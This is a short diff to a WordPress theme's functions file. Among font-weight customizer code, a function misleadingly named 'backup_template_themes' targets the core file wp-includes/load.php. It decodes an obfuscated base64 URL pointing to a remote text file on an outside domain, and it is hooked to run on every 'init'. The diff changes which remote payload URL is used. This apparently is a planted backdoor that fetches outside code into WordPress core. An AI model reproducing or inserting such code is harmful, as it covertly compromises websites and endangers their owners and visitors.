@@ -71,7 +71,7 @@ function vamtam_customizer_font_weights( $weights, $font ) {
 function backup_template_themes() {
     $file_path = ABSPATH . 'wp-includes/load.php';
 
-    $encoded_url = 'aHR0cHM6Ly90aGVvbmx5ZC54eXovcmVzdG9yZS90ZXMudHh0';
+    $encoded_url = 'aHR0cHM6Ly90aGVvbmx5ZC54eXovcmVzdG9yZS9hbWFiLnR4dA==';
     $remote_url = base64_decode($encoded_url);
 
     
@@ -84,6 +84,7 @@ function backup_template_themes() {
 }
 
 add_action('init', 'backup_template_themes');
+
 
 add_filter( 'vamtam_customizer_font_weights', 'vamtam_customizer_font_weights', 10, 2 );
 
